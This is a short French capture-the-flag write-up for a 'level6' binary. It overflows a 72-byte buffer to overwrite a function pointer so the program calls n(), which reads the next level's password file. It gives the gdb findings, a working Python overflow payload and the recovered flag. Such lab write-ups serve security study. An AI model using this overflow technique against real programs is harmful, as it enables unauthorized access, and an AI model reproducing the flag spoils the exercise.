Dans ce niveau on voit que dans e main il y a un appel a un pointeur sur fonction `0x080484d0 <+84>:	call   *%eax`

Si on regarde les fonctions existantes nous avec `m()` et `n()`

La fonction `m()` renvoi `Nope` pendant que `n()` cherche a exec `"/bin/cat /home/user/level7/.pass"`

On va donc chercher a appeler `n()` en changeant le pointeur sur fonction

Si on execute le prog avec un arg et qu'on break avant l'appel on a `print $eax = 134513768 = 0x8048468 = adresse de m()`

Et si on le fait segfault avec 72 'A' on voit que l'adresse qui est appele est `0x41414141`

L'objectif est donc `set $eax = 134513748 = 0x08048454 = adresse de n()`

On va lui passer en arg `72 'A'` + l'adresse de `n()` :
    `(python -c 'print"A"*72 + "\x54\x84\x04\x08"') | xargs ./level6`

La fonction `n()` est appele et le flag sort : `f73dcb7a06f60e3ccc608990b0a046359d42a1a0489ffeefd0d9cb2d7c9cb82d`